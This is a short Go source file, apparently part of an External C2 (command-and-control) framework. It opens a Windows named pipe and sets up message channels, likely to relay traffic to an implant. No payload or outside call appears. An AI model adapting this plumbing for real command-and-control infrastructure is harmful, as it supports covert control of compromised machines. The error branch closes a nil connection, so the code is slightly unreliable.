package ExternalC2Go

import (
	"gopkg.in/natefinch/npipe.v2"
	"log"
	"net"
	"time"
)

var(
	FromPipe = make(chan EC2Message)
	ToPipe = make(chan EC2Message)
	PipeConn net.Conn
)

// going to move write and read from ClientBot soon
func StartPipe(name string, sleepBefore time.Duration) {
	var err error

	time.Sleep(sleepBefore)

	println("Starting named pipe")
	println(`\\.\pipe\` + name)

	PipeConn, err = npipe.Dial(`\\.\pipe\` + name)

	if err != nil {
		PipeConn.Close()
		log.Fatal(err)
	}

	println("Created named pipe!!")
}
